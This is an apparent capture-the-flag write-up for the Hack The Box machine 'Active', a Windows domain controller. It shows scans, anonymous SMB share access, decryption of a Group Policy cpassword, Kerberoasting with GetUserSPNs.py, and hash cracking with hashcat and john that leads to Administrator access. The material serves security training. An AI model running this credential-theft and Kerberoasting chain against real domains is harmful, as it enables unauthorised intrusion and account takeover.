# Hackthebox - Active - Windows

- https://app.hackthebox.com/machines/Active

## Nmap

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -Pn -p- 10.10.10.100                    
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 17:37 EST
Nmap scan report for 10.10.10.100
Host is up (0.026s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-05 22:42:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
[17:40]
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-03-05T22:43:30
|_  start_date: 2022-03-05T22:35:40
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: 4m04s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.66 seconds
```

## SMB

### enum4linux
```
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 10.10.10.100                                                                                                                                                                             1 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar  5 17:55:41 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.100
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.100    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.100    |
 ============================================ 
Looking up status of 10.10.10.100
No reply from 10.10.10.100

 ===================================== 
|    Session Check on 10.10.10.100    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.100 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.100    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.10.100    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.100 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.10.100 from srvinfo:
        10.10.10.100   Wk Sv PDC Tim NT     Domain Controller
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b

 ============================= 
|    Users on 10.10.10.100    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/ADMIN$   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/C$       Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/IPC$     Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Replication      Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/SYSVOL   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Users    Mapping: DENIED, Listing: N/A

 ==================================================== 
|    Password Policy Information for 10.10.10.100    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.100 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.100)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.10.100    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.10.100    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Mar  5 17:56:07 2022
```

### Anonymous connect with smbclient

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.10.100   
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

- We can connect to a share anonymously
```
smbclient --no-pass \\\\10.10.10.100\\Replication
```

- We have a group.xml file here 
```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml
```
```
┌──(kali㉿kali)-[~]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

- We can use gpp-decrypt to get the password
```
┌──(kali㉿kali)-[~]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ         
GPPstillStandingStrong2k18
```
- We can connect to a share with these creds

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.10.100\\Users -U active.htb\\SVC_TGS
Enter ACTIVE.HTB\SVC_TGS's password: 
```
- We can get the user flag

## Privilege escalation

- We can now try to kerberoast
  ```
  GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
  ```

- I had to use ntpdate becase I was having this error `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` this corrected it: `sudo ntpdate 10.10.10.100`
- This way we get a hash.
- We need to crack it with john or hashcat
- For hashcat I needed at least 4 gb of memory on my machine
```
hashcat -m 13100 hashkerb.txt /usr/share/wordlists/rockyou.txt -O filename
```

- With john it worked smoothly

```
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerbhash.txt
```

- We can now use smb and connect as Administrator

```
smbclient \\\\10.10.10.100\\Users -U active.htb\\Administrator
```

## Resources

**There is more than one way to do it :)**

{% embed url="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit" %} Hackthebox Active writeup - Rana Khalil Gitbook {% endembed %}  
